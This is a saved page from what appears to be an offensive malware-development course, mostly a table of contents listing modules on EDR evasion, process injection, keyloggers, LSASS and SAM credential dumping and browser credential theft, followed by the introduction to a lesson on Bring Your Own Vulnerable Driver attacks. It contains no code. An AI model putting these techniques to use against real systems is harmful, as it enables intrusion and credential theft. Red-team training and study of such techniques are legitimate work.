                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./37.html&amp;toc=true">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./38.html&amp;toc=true">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./39.html&amp;toc=true">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./40.html&amp;toc=true">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./41.html&amp;toc=true">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./42.html&amp;toc=true">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./43.html&amp;toc=true">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./44.html&amp;toc=true">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./45.html&amp;toc=true">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./46.html&amp;toc=true">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./47.html&amp;toc=true">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./48.html&amp;toc=true">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./49.html&amp;toc=true">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./50.html&amp;toc=true">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./51.html&amp;toc=true">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./52.html&amp;toc=true">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./53.html&amp;toc=true">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./54.html&amp;toc=true">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./55.html&amp;toc=true">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./56.html&amp;toc=true">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./57.html&amp;toc=true">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./58.html&amp;toc=true">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./59.html&amp;toc=true">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./60.html&amp;toc=true">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./61.html&amp;toc=true">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./62.html&amp;toc=true">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./63.html&amp;toc=true">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./64.html&amp;toc=true">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./65.html&amp;toc=true">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./66.html&amp;toc=true">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./67.html&amp;toc=true">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html&amp;toc=true">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html&amp;toc=true">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html&amp;toc=true">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html&amp;toc=true">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html&amp;toc=true">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html&amp;toc=true">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html&amp;toc=true">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html&amp;toc=true">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html&amp;toc=true">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html&amp;toc=true">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html&amp;toc=true">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html&amp;toc=true">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html&amp;toc=true">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html&amp;toc=true">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html&amp;toc=true">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./26.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html?toc=true">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./27/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./2#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./28.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>



      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="27_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 27 - Bring Your Own Vulnerable Driver
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="27_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="27_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="27_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="27_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="27_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/BYOVD" target="_blank">
                    <img src="27_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Bring Your Own Vulnerable Driver (BYOVD)</h2>
<h3 id="toc-heading-1">Introduction</h3>
<p>Drivers are software components that enable communication and 
interaction between hardware devices (such as printers, graphics cards, 
and network adapters) and the OS of a computer. They serve as 
intermediaries that facilitate the translation of high-level commands 
from the operating system into instructions that the hardware can 
understand and execute.</p>
<p>Drivers typically operate in kernel mode, granting them full control 
over the machine. This makes drivers an attractive target for attackers,
 allowing them to perform actions otherwise impossible. Recognizing this
 potential for abuse, Microsoft implemented signature enforcement for 
drivers to enhance system security. This means that by default, you 
cannot load unsigned drivers without toggling the setting from the boot 
menu.</p>
<p>It's possible to list installed drivers by running the <code>driverquery</code> command on the Command Prompt.</p>
<img width="900px" alt="image" style="margin:auto" src="27_files/driverquery.png">
<h3 id="toc-heading-2">Circumventing Signature Enforcement</h3>
<p>Bring Your Own Vulnerable Driver or BYOVD for short, is a technique 
that involves abusing a legitimately-signed vulnerable driver to perform
 malicious actions that cannot be achieved from user-mode processes. 
Among these actions, the most frequently pursued goal is to terminate 
security solutions, a tactic commonly observed in many APT and 
ransomware attacks, as detailed in the referenced papers below:</p>
<ul>
<li>
<p><a href="https://www.sentinelone.com/blog/terminator-edr-killer-spyboy-detecting-and-preventing-a-windows-byovd-attack/" target="_blank">Terminator EDR Killer (Spyboy)</a>.</p>
</li>
<li>
<p><a href="https://thehackernews.com/2023/04/ransomware-hackers-using-aukill-tool-to.html" target="_blank">Ransomware Hackers Using AuKill Tool to Disable EDR Software Using BYOVD Attack</a>.</p>
</li>
<li>
<p><a href="https://thehackernews.com/2022/10/blackbyte-ransomware-abuses-vulnerable.html" target="_blank">BlackByte Ransomware Abuses Vulnerable Windows Driver to Disable Security Solutions</a>.</p>
</li>
</ul>
<h3 id="toc-heading-3">Exploitation Scenario</h3>
<p>An example of how a vulnerable driver can be exploited unfolds as 
follows: The attacker places two files onto a computer the exploit 
(e.g., <code>implant.exe</code>) and the signed vulnerable driver. The 
exploit loads the vulnerable driver and proceeds to exploit the 
identified vulnerability, ultimately gaining the ability to perform 
different actions such as executing code within the kernel-mode address 
space. This scenario is illustrated in the diagram below.</p>
